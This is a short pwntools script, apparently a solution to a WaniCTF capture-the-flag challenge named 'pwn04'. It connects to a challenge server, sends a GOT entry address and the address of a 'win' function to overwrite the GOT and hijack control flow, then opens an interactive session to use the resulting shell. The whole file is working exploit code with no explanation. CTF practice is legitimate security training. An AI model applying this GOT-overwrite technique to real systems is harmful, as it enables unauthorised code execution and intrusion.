from pwn import *

#p = process(["./pwn04"])
p = remote("got.wanictf.org", 9004)

win = 0x400807

got_addr = 0x601038
res = p.recvuntil(":")
#res = int(p.recvuntil(":").splitlines()[-1].split(" ")[-1].replace(".\n", "").split("-")[0].replace("(", ""), 16)
#print(res)
p.sendline("0x601038")

res = p.recvuntil(":").splitlines()[-1]
#print(res)    
p.sendline("0x400807")

p.interactive()
